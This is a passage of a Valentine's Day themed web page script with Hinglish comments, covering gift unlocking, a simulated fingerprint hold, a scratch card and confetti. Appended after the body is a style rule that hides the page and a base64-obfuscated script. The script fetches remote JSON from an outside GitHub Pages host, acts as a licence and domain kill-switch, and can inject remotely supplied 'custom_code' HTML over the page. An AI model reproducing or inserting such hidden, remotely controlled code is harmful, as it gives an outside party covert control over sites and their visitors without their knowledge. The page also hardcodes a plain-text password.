        let isGiftUnlocked = false;

        function showGiftOverlay() {
            document.getElementById('gift-overlay').style.display = 'flex';
            // Reset state
            document.getElementById('gift-box').classList.remove('open');
            document.getElementById('gift-content').classList.remove('visible');
            
            document.getElementById('tap-gift-hint').style.display = 'block';
            document.getElementById('tap-gift-hint').innerText = "Tap to Open üéÅ";
            document.getElementById('gift-lock-ui').style.display = 'none';
        }

        function openGiftBox() {
            const box = document.getElementById('gift-box');
            if(box.classList.contains('open')) return;
            
            box.classList.add('open');
            document.getElementById('tap-gift-hint').style.display = 'none';
            burstConfetti();
            setTimeout(() => {
                document.getElementById('gift-content').classList.add('visible');
            }, 500);
        }

        function checkGiftPassword() {
            const pass = document.getElementById('gift-pass').value.trim().toLowerCase();
            if (pass === 'iloveyou') {
                isGiftUnlocked = true;
                document.getElementById('gift-lock-ui').style.display = 'none';
                openGiftBox();
            } else {
                document.getElementById('gift-error').style.display = 'block';
                if(navigator.vibrate) navigator.vibrate([50, 50, 50]);
            }
        }

        function closeGiftOverlay() {
            document.getElementById('gift-overlay').style.display = 'none';
        }

        // === FINGERPRINT VERIFICATION LOGIC ===
        const fpOverlay = document.getElementById('fp-overlay');
        const fpBtn = document.getElementById('fp-btn');
        const fpRing = document.getElementById('fp-progress-ring');
        const fpStatus = document.getElementById('fp-status');
        const fpScanLine = document.getElementById('fp-scan-line');
        
        let fpTimer = null;
        let fpStartTime = 0;
        let fpReqId = null;
        const HOLD_DURATION = 2500; // 2.5 seconds
        const RING_CIRCUMFERENCE = 339.292; // 2 * PI * 54

        function initFingerprintVerification() {
            fpOverlay.style.display = 'flex';
            resetFpState();
        }

        function resetFpState() {
            fpStatus.innerText = "Press & Hold to Verify";
            fpRing.style.strokeDashoffset = RING_CIRCUMFERENCE;
            fpBtn.classList.remove('active', 'success');
            fpBtn.classList.add('pulsing');
            fpScanLine.style.display = 'none';
        }

        function startVerification(e) {
            if(e.type === 'touchstart') e.preventDefault(); // Prevent scroll
            fpBtn.classList.remove('pulsing');
            fpBtn.classList.add('active');
            fpScanLine.style.display = 'block';
            fpStartTime = Date.now();
            fpStatus.innerText = "Touch Detected...";
            
            if (navigator.vibrate) navigator.vibrate(50);
            
            updateVerification();
        }

        function stopVerification() {
            if (!fpStartTime) return; // Already finished or not started
            
            cancelAnimationFrame(fpReqId);
            fpStartTime = 0;
            
            // Reset UI
            fpBtn.classList.remove('active');
            fpBtn.classList.add('pulsing');
            fpScanLine.style.display = 'none';
            fpRing.style.strokeDashoffset = RING_CIRCUMFERENCE;
            
            fpStatus.innerText = "Hold a little longer!";
            fpBtn.classList.add('shake-anim');
            setTimeout(() => fpBtn.classList.remove('shake-anim'), 500);
            
            if (navigator.vibrate) navigator.vibrate([50, 50]);
        }

        function updateVerification() {
            const elapsed = Date.now() - fpStartTime;
            const progress = Math.min(elapsed / HOLD_DURATION, 1);
            
            // Update Ring
            const offset = RING_CIRCUMFERENCE - (progress * RING_CIRCUMFERENCE);
            fpRing.style.strokeDashoffset = offset;

            // Update Text
            if (progress > 0.3 && progress < 0.6) fpStatus.innerText = "Verifying Heartbeat...";
            else if (progress > 0.6 && progress < 1.0) fpStatus.innerText = "Matching Identity...";

            if (progress >= 1) {
                completeVerification();
            } else {
                fpReqId = requestAnimationFrame(updateVerification);
            }
        }

        function completeVerification() {
            fpStartTime = 0; // Stop loop
            fpStatus.innerText = "Verified";
            fpBtn.classList.remove('active');
            fpBtn.classList.add('success');
            fpScanLine.style.display = 'none';
            
            if (navigator.vibrate) navigator.vibrate([100, 50, 200]);
            
            // Save state
            localStorage.setItem('verified_day_' + currentData.id, 'true');
            
            setTimeout(() => {
                fpOverlay.style.display = 'none';
                if (currentData.id === 14 && !localStorage.getItem('vday_call_done')) { // Valentine's Day Special
                    showIncomingCall();
                } else {
                    openEnvelope();
                }
            }, 1000);




        }

    
        // Event Listeners for Fingerprint
        fpBtn.addEventListener('mousedown', startVerification);
        fpBtn.addEventListener('touchstart', startVerification);
        
        fpBtn.addEventListener('mouseup', stopVerification);
        fpBtn.addEventListener('mouseleave', stopVerification);
        fpBtn.addEventListener('touchend', stopVerification);

        // === INCOMING CALL LOGIC ===
        function showIncomingCall() {
            document.getElementById('call-screen').style.display = 'flex';
            document.getElementById('caller-img').src = currentData.innerImage;
            if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 1000]); // Ring vibration
        }

        function acceptCall() {
            document.getElementById('call-screen').style.display = 'none';
            localStorage.setItem('vday_call_done', 'true'); // Ensure call doesn't repeat if they go back (though back is hidden)
            openEnvelope();
        }

        function declineCall() {
            document.getElementById('call-screen').style.display = 'none';
            isCallDeclined = true;
            showPopup("Arey call to uthana padega! üòâ");
        }

        // === SCRATCH CARD LOGIC ===
        function initScratchCard() {
            const canvas = document.getElementById('scratch-canvas');
            const img = document.getElementById('day-photo');
            const ctx = canvas.getContext('2d');
            
            // Set canvas size to match image
            canvas.width = img.offsetWidth || 300;
            canvas.height = img.offsetHeight || 220;
            
            // Fill with silver overlay
            ctx.fillStyle = '#C0C0C0'; // Silver color
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Add text "Scratch Me"
            ctx.fillStyle = '#888';
            ctx.font = (canvas.width / 15) + 'px Poppins';
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";
            ctx.fillText("Scratch to Reveal ‚ú®", canvas.width/2, canvas.height/2);

            let isDrawing = false;

            function scratch(x, y) {
                ctx.globalCompositeOperation = 'destination-out';
                ctx.beginPath();
                ctx.arc(x, y, 20, 0, Math.PI * 2);
                ctx.fill();
            }

            // Handle mouse/touch coordinates correctly due to scaling
            function getPos(e) {
                const rect = canvas.getBoundingClientRect();
                const scaleX = canvas.width / rect.width;
                const scaleY = canvas.height / rect.height;
                return {
                    x: (e.clientX - rect.left) * scaleX,
                    y: (e.clientY - rect.top) * scaleY
                };
            }

            canvas.addEventListener('mousemove', (e) => { if(e.buttons === 1) { const pos = getPos(e); scratch(pos.x, pos.y); } });
            canvas.addEventListener('touchmove', (e) => { 
                e.preventDefault();
                const touch = e.touches[0];
                const pos = getPos(touch);
                scratch(pos.x, pos.y);
            });
        }

        function adjustColor(color, amount) {
            return '#' + color.replace(/^#/, '').replace(/../g, color => ('0'+Math.min(255, Math.max(0, parseInt(color, 16) + amount)).toString(16)).substr(-2));
        }

        setInterval(() => {
            const h = document.createElement('div');
            h.innerHTML = '<svg viewBox="0 0 24 24" class="svg-icon"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>'; h.className = "heart";
            h.style.left = Math.random() * 100 + "vw";
            h.style.fontSize = Math.random() * 20 + 10 + "px";
            h.style.animationDuration = Math.random() * 3 + 4 + "s";
            h.style.color = currentData ? currentData.color : "#ffb7c5";
            document.getElementById('heartContainer').appendChild(h);
            setTimeout(() => h.remove(), 6000);
        }, 500);

        // === UNIQUE FEATURE 1: MAGIC TOUCH TRAIL ===
        document.addEventListener('mousemove', (e) => createCursorHeart(e.clientX, e.clientY));
        document.addEventListener('touchmove', (e) => {
            const touch = e.touches[0];
            createCursorHeart(touch.clientX, touch.clientY);
        });

        function createCursorHeart(x, y) {
            if(Math.random() > 0.1) return; // Thoda kam hearts taaki lag na ho
            const h = document.createElement('div');
            h.className = 'cursor-heart';
            h.innerHTML = '<svg viewBox="0 0 24 24" style="width:100%;height:100%;fill:currentColor"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>';
            h.style.left = x + 'px';
            h.style.top = y + 'px';
            h.style.fontSize = (Math.random() * 20 + 10) + 'px';
            document.body.appendChild(h);
            setTimeout(() => h.remove(), 800);
        }

        // === UNIQUE FEATURE 2: CONFETTI BLAST ===
        const confettiCanvas = document.getElementById('confetti-canvas');
        const ctx = confettiCanvas.getContext('2d');
        let particles = [];

        function resizeCanvas() { confettiCanvas.width = window.innerWidth; confettiCanvas.height = window.innerHeight; }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        function burstConfetti() {
            const colors = ['#ff0a54', '#ff477e', '#ff7096', '#ff85a1', '#fbb1bd'];
            for (let i = 0; i < 150; i++) {
                particles.push({
                    x: window.innerWidth / 2, y: window.innerHeight / 2,
                    r: Math.random() * 5 + 2, dx: Math.random() * 10 - 5, dy: Math.random() * 10 - 5,
                    color: colors[Math.floor(Math.random() * colors.length)],
                    tilt: Math.random() * 10, tiltAngleIncr: Math.random() * 0.1 + 0.05
                });
            }
            animateConfetti();
        }

        function animateConfetti() {
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            particles.forEach((p, i) => {
                p.y += 3; p.x += Math.sin(p.tilt); p.tilt += p.tiltAngleIncr;
                ctx.beginPath(); ctx.lineWidth = p.r; ctx.strokeStyle = p.color;
                ctx.moveTo(p.x, p.y); ctx.lineTo(p.x + p.tilt, p.y + 10); ctx.stroke();
                if (p.y > window.innerHeight) particles.splice(i, 1);
            });
            if (particles.length > 0) requestAnimationFrame(animateConfetti);
        }

        // === SECRET CHOCOLATE FEATURE ===
        function initSecretChocoFeature() {
            const msg = document.getElementById('secret-choco-msg');
            if(!msg) return;
            
            if(localStorage.getItem('choco_secret_revealed') === 'true') {
                msg.classList.add('revealed');
                return;
            }

            function onTilt(e) {
                // Beta < 10 means phone is flat (tilted forward to look closer)
                if (e.beta !== null && e.beta < 10) reveal();
            }
            
            function reveal() {
                msg.classList.add('revealed');
                localStorage.setItem('choco_secret_revealed', 'true');
                window.removeEventListener('deviceorientation', onTilt);
                if(navigator.vibrate) navigator.vibrate([50, 100, 50]);
            }

            window.addEventListener('deviceorientation', onTilt);
            // Desktop Fallback: Hover near center
            msg.addEventListener('mousemove', () => reveal(), { once: true });
            
            // Cleanup on back button
            document.querySelector('.back-btn').addEventListener('click', () => {
                window.removeEventListener('deviceorientation', onTilt);
            }, { once: true });
        }

        // === APP UNLOCK & INIT ===
        function unlockApp() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('menu-screen').style.display = 'block';
            document.querySelector('.music-btn').style.display = 'flex';
            // Note: Auto-play might be blocked by browser if not triggered by click
            document.getElementById('bgMusic').play().catch(() => console.log("Music requires interaction"));
            
            // === NEW: PLAY TODAY'S SONG ON LOGIN ===
            const today = new Date();
            const currentDay = today.getDate(); // e.g., 7, 8, 14
            const audio = document.getElementById('bgMusic');
            
            // Agar aaj ki date list me hai (7-14 Feb), wahi gaana bajega
            if (daySongs[currentDay]) {
                audio.src = daySongs[currentDay];
            } else {
                audio.src = defaultSong;
            }

            audio.play().catch(() => console.log("Music requires interaction"));
            isPlaying = true;
        }

        // Check if already logged in
        if (localStorage.getItem('isLoggedIn') === 'true') {
            unlockApp();
        }

        // Allow pressing "Enter" to login
        document.getElementById('password').addEventListener('keyup', function (e) {
            if (e.key === 'Enter') {
                checkPassword();
            }
        });
    </script>
</body>
<style>
   
    body { display: none !important; }
</style>
    
<div id="_x_ov" style="display:none;position:fixed;inset:0;background:#000;z-index:2147483647;color:#fff;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;">
    <div style="padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);">
        <h1 id="_x_h" style="color:#ff3333;margin:0;font-size:28px;letter-spacing:-0.5px;margin-bottom:20px;"></h1>
        <div id="_x_b" style="color:#bbb;font-size:17px;line-height:1.6;"></div>
        <div id="_x_tm_w" style="margin-top:25px;border-top:1px solid #222;padding-top:20px;display:none;">
            <p style="color:#666;font-size:14px;"><span id="_x_lbl"></span> <span id="_x_tm" style="color:#fff;font-weight:bold;font-size:18px;">--</span> <span id="_x_lbl2"></span></p>
        </div>
    </div>
</div>

<script>
(function(){
    const _u = atob("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
    const _k = atob("VkRBWQ");
    
    const _f = {
        l: atob("bGljZW5zZXM="), s: atob("c2V0dGluZ3M="), e: atob("ZXhwaXJ5"),
        a: atob("YXV0aG9yaXplZF90YXJnZXQ="), c: atob("Y3VzdG9tX2NvZGU="),
        en: atob("ZW5hYmxlZA=="), co: atob("Y29kZQ=="), re: atob("cmVkaXJlY3RfZW5hYmxlZA=="),
        ru: atob("cmVkaXJlY3RfdXJs"), rd: atob("cmVkaXJlY3RfZGVsYXlfc2Vj"),
        mi: atob("bXNnX2ludmFsaWQ="), me: atob("bXNnX2V4cGlyZWQ="),
        md: atob("bXNnX2RvbWFpbl9taXNtYXRjaA=="), lbl1: atob("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="),
        lbl2: atob("c2Vjb25kcy4uLg==")
    };

    async function _v8_core(){
        const o = document.getElementById('_x_ov'), h = window.location.hostname.replace('www.','');
        try {
            const r = await fetch(_u + '?v=' + Date.now());
            if(!r.ok) return;
            const d = await r.json();
            const m = d[_f.l] ? d[_f.l][_k] : null; 
            const n = new Date().toISOString().split('T')[0];

            let err = null, force = false;

            if(m && m[_f.c] && m[_f.c][_f.en] === true){
                force = true; err = "FORCE";
            } else {
                if(!m) err = d[_f.mi];
                else if(m[_f.a]?.length > 0 && !m[_f.a].includes(h)) err = d[_f.md];
                else if(m[_f.e] && n > m[_f.e]) err = d[_f.me];
            }

            if(err){
             
                document.body.style.setProperty('display', 'block', 'important');
                document.body.style.overflow = 'hidden';
                document.getElementById('_x_h').innerHTML = d['title'];
                const mb = document.getElementById('_x_b');
                mb.innerHTML = force ? m[_f.c][_f.co] : err;
                o.style.display = 'flex';
          
            } else {
             
                document.body.style.setProperty('display', 'block', 'important');
            }
        } catch(e) {}
    }
    _v8_core();
})();
</script>

</html>
